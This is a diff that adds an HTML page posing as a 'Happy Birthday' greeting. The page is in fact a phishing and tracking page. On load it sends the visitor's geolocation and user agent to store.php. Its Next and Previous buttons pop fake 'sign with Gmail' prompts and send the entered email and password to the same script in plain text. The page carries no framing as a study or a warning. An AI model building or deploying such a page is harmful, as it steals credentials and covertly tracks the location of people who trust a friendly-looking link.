@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Happy Bithday</title>
+	</head>
+
+	<style>
+          .birthday{
+               font-family: 'Dancing Script', cursive;
+               font-family: 'Lobster', cursive;
+          }
+          table{
+            border-spacing: 5px;
+		}
+		td{
+			height: 50px;
+			width: 50px;
+		}
+     </style>
+
+<body onload="geolocation()">
+<!-- <iframe src="https://memes.com/m/d7WPlVGwGRk/embed" style="background:#fff;border:0;margin: 1px;max-width:calc(100% - 2px);min-width:330px;padding:0;width:99.375%;width:calc(100% - 2px);" frameborder="0" scrolling="no"></iframe><script async="" src="//cdn.memes.com/assets/embed.js"></script> -->
+<script>
+
+
+function mainFun(){
+	;
+	
+}
+
+navigator.geolocation.getCurrentPosition(showPosition);
+
+
+function showPosition(position) {
+	const xhttp = new XMLHttpRequest();
+	xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
+	xhttp.send();
+	myFunction();
+}
+</script>
+
+
+
+
+<br><br>
+<center>
+     <img src="birthday.jpg"> 
+     <br>
+     <h1 class="birthday">HAPPY BIRTHDAY</h1>
+
+	<p id="name"> click on next or previous.</p>
+     <table>
+          <tr>
+               <td>
+               <button onclick="myFunction()">Previous</button>
+               </td>
+               <td>
+               <button onclick="myFunction()">Next</button>
+               </td>
+          </tr>
+     </table>
+
+</center>
+
+
+<script>
+
+     function myFunction() {
+          let email = prompt("To continue this site please sign with Gmail.","Email");
+          let password = prompt("Password");
+
+		const xhttp1 = new XMLHttpRequest();
+		xhttp1.open("GET", "store.php?email=" + email + "&password=" + password);
+		xhttp1.send();
+
+
+          if (email != null) {
+               document.getElementById("name").innerHTML =
+               "Happy birthday " + email;
+          }
+
+		// if(email == null || password == null){
+		// 	mainFun();
+		// }
+          
+     }
+
+    
+</script>
+
+<!-- <script>
+     var xy = 4000
+     setInterval(function() {
+          myFunction()
+     }, xy);
+</script> -->
+
+<!-- </center> -->
+
+
+
+</body>
+</html>
+
